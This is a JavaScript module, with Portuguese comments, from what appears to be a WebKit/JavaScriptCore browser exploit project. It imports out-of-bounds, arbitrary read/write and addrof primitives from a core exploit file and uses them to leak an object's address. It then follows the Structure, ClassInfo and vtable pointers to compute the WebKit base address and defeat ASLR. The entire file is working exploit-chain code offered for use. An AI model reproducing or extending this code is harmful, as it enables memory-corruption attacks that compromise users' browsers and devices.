// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43q - Correção de Importação)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    arb_write,
    oob_write_absolute, // Mantido para o gatilho da TC
    isOOBReady,
    selfTestOOBReadWrite,
    selfTestTypeConfusionAndMemoryControl,
    attemptAddrofUsingCoreHeisenbug // <<<< CORREÇÃO APLICADA AQUI: Importação adicionada
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
const OOB_WRITE_VALUES_V82 = [0xABABABAB];
const PROBE_CALL_LIMIT_V82 = 10;

// Alvos para as tentativas de addrof
const targetObjectForCoreAddrof = { name: "MyTargetObjectForCoreAddrof_R43q", value: Date.now() };

let leaked_target_object_addr = null;

function isValidPointer(ptr) {
    if (!isAdvancedInt64Object(ptr)) return false;
    if (ptr.high() === 0) return false;
    if ((ptr.high() & 0x7FF00000) === 0x7FF00000) return false;
    return true;
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() { // Nome da função mantido
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43q`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Testando addrof do Core Exploit ---`, "test");
    document.title = `${FNAME_CURRENT_TEST_BASE} Init...`;

    let final_result = {
        errorOccurred: null,
        addrof_result: { success: false, msg: "Not run." },
        webkit_leak: { success: false, msg: "Not run." }
    };

    try {
        logS3(`--- Fase 0 (R43q): Sanity Checks do Core Exploit ---`, "subtest");
        const coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
        logS3(`Sanity Check (selfTestOOBReadWrite): ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
        if (!coreOOBReadWriteOK) throw new Error("Sanity check OOB R/W falhou. Abortando.");

        const coreTCAndMemControlOK = await selfTestTypeConfusionAndMemoryControl(logS3);
        logS3(`Sanity Check (selfTestTypeConfusionAndMemoryControl): ${coreTCAndMemControlOK ? 'SUCESSO' : 'FALHA'}`, coreTCAndMemControlOK ? 'good' : 'critical');
        if (!coreTCAndMemControlOK) throw new Error("Sanity check de TC/MemControl falhou. A técnica de addrof do core pode não funcionar.");

        // --- FASE 1: TESTE DO ADDROF DO CORE EXPLOIT ---
        logS3(`--- Fase 1 (R43q): Testando attemptAddrofUsingCoreHeisenbug ---`, "subtest");
        
        targetObjectForCoreAddrof.r = Math.random();
        const coreAddrofResult = await attemptAddrofUsingCoreHeisenbug(targetObjectForCoreAddrof);
        logS3(`Resultado attemptAddrofUsingCoreHeisenbug: Success=${coreAddrofResult.success}, Msg=${coreAddrofResult.message}`, coreAddrofResult.success ? 'good' : 'warn');
        logS3(`  Detalhes Addrof Core: Double=${coreAddrofResult.leaked_address_as_double}, Int64=${coreAddrofResult.leaked_address_as_int64 || 'N/A'}`, 'leak');

        if (coreAddrofResult.success && coreAddrofResult.leaked_address_as_int64) {
            const tempAddr = new AdvancedInt64(coreAddrofResult.leaked_address_as_int64);
            if (isValidPointer(tempAddr)) {
                leaked_target_object_addr = tempAddr;
                final_result.addrof_result.success = true;
                final_result.addrof_result.msg = `Addrof do Core Exploit FUNCIONOU! Addr: ${leaked_target_object_addr.toString(true)}`;
                logS3(final_result.addrof_result.msg, "vuln");
            } else {
                 final_result.addrof_result.msg = `Addrof do Core Exploit retornou sucesso, mas o Int64 (${coreAddrofResult.leaked_address_as_int64}) não parece ponteiro válido.`;
                 logS3(final_result.addrof_result.msg, "error");
            }
        } else {
             final_result.addrof_result.msg = `Addrof do Core Exploit falhou ou não retornou Int64.`;
             logS3(final_result.addrof_result.msg, "error");
        }

        if (!final_result.addrof_result.success) {
            throw new Error(final_result.addrof_result.msg);
        }

        // --- FASE 2: VAZAMENTO DA BASE DO WEBKIT ---
        logS3(`  --- Fase 2 (R43q): Vazamento da Base do WebKit ---`, "subtest");
        const structure_addr = await arb_read(leaked_target_object_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET), 8);
        if (!isValidPointer(structure_addr)) throw new Error("Ponteiro para Structure inválido.");
        logS3(`[WebKitLeak] Endereço da Structure: ${structure_addr.toString(true)}`, "leak");

        const class_info_addr = await arb_read(structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET), 8);
        if (!isValidPointer(class_info_addr)) throw new Error("Ponteiro para ClassInfo inválido.");
        logS3(`[WebKitLeak] Endereço do ClassInfo: ${class_info_addr.toString(true)}`, "leak");
        
        const vtable_ptr = await arb_read(class_info_addr, 8);
        if (!isValidPointer(vtable_ptr)) throw new Error("Ponteiro para vtable inválido.");
        logS3(`[WebKitLeak] Ponteiro para vtable: ${vtable_ptr.toString(true)}`, "leak");

        const page_mask = new AdvancedInt64(~0xFFFFF, 0xFFFFFFFF);
        const webkit_base = vtable_ptr.and(page_mask);
        
        final_result.webkit_leak.webkit_base = webkit_base.toString(true);
        final_result.webkit_leak.success = true;
        final_result.webkit_leak.msg = `Candidato a base do WebKit (a partir da vtable): ${final_result.webkit_leak.webkit_base}`;
        logS3(`[WebKitLeak] SUCESSO! ${final_result.webkit_leak.msg}`, "vuln");
        document.title = `${FNAME_CURRENT_TEST_BASE}_SUCCESS!`;

    } catch (e_outer) {
        if (!final_result.errorOccurred) final_result.errorOccurred = `Erro geral: ${e_outer.message}`;
        logS3(`  CRITICAL ERROR na execução (R43q): ${e_outer.message || String(e_outer)}`, "critical");
        console.error("Outer error in R43q:", e_outer);
        document.title = `${FNAME_CURRENT_TEST_BASE}_FAIL!`;
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test");
    logS3(`Resultado Final (R43q): ${JSON.stringify(final_result, null, 2)}`, "debug");
    return final_result;
}
